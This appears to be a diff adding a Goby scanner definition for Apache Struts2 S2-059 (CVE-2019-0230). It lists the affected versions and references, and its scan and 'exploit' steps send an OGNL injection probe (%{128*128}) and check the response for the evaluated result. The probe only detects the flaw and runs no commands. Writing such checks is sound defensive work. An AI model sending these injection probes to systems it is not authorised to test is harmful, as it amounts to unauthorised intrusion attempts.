@@ -1,0 +1,98 @@
+{
+      "Name": "Apache Struts2 S2-059 RCE CVE-2019-0230",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "app=\"struts2\" || app=\"java\" || app=\"jsp\" || product=\"JAVA\" || product=\"JSP\"",
+      "Description": "Struts2 is a popular and mature web application framework based on the MVC design pattern.",
+      "Product": "Struts2",
+      "Homepage": "https://struts.apache.org/",
+      "Author": "",
+      "Impact": "Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.",
+      "Recommendation": "https://cwiki.apache.org/confluence/display/ww/s2-059",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2019-0230",
+            "https://cwiki.apache.org/confluence/display/ww/s2-059"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/?id=goby%25{128*128}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "goby16384",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/?id=goby%25{128*128}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "goby16384",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
